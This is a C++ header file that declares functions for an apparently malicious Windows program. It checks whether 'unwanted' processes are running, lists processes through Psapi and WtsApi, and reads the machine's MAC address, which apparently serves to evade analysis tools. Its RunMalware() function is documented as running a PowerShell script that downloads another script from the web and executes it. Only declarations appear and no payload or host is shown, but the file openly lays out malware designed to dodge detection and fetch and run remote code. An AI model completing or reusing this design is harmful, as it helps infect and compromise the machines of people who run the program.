#pragma once
#pragma warning( push )
#pragma warning( disable : 4365)
#include <stdio.h>
#include <unordered_set>
#pragma warning( pop )
using namespace std;


/* @brief Checks whether one of the processes in the target_processes is in the vector of running_processes
*
* @param target_processes - pointer to the unordered-set wstring, describing unwanted processes.
* @param running_processes - pointer to the vector wstring, describing unwanted processes.
* @return true / false whether Is a process in 2 lists or not.
*/
bool IsAnyProcessRunning(const unordered_set<wstring>& target_processes, const vector<wstring>& running_processes);


/* @brief Returns all running processes names by uses the 'Psapi' library.
*
* @param running_processes - pointer to a empty vector-wstring, which will be filled with the list of running processes.
* @return true / false whether the function was successful in receiving or not.
*/
bool GetProcessNamesByPsApi(vector<wstring>& running_processes);

/* @brief Returns all running processes names by uses the 'WtsApi' library.
*
* @param running_processes - pointer to a empty vector-wstring, which will be filled with the list of running processes.
* @return true / false whether the function was successful in receiving or not.
*/
bool GetProcessNamesByWtsApi(vector<wstring>& running_processes);

/* @brief Returns the first MAC address that appears in IP_ADAPTER_ADDRESSES.
*
* @param mac_address - pointer to a empty wstring, which will hold the MAC address.
* @return true / false whether the function was successful in receiving or not.
*/
bool GetMacAddress(wstring& mac_address);

/* @brief Runs a ps script that requests a web address a ps script and runs it.
*
* @return true / false whether the function was successful to run the mallware or not.
*/
bool RunMalware();

//DWORD WINAPI ProccessChecker(LPVOID lpParam);